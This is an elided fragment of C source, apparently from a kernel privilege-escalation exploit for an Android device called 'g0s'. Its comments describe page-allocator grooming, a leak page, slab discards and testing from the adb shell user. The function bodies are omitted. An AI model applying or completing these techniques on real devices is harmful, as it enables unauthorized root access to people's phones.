 ...
 * read: adb-verified on g0s that uid=2000 shell (even with the
...
static int use_mm_track(void) {
   ...
   * The kprobe backend is unavailable on g0s anyway ("kprobe read failed"),
 ...
 * discarded.  verified on g0s: without this, the freshly discarded
 ...
 * before the leak page discards.  g0s inserts freed pages at the TAIL of
...
uintptr_t prepare_kernel_page(int payload_mode) {
   ...
   * (verified on g0s: zero discard_slab hits).
   * ---------------------------------------------------------------- */
  if (!oppo_teardown)
   ...
   * one final head page; with g0s's tail-insert/shuffle buddy frees the
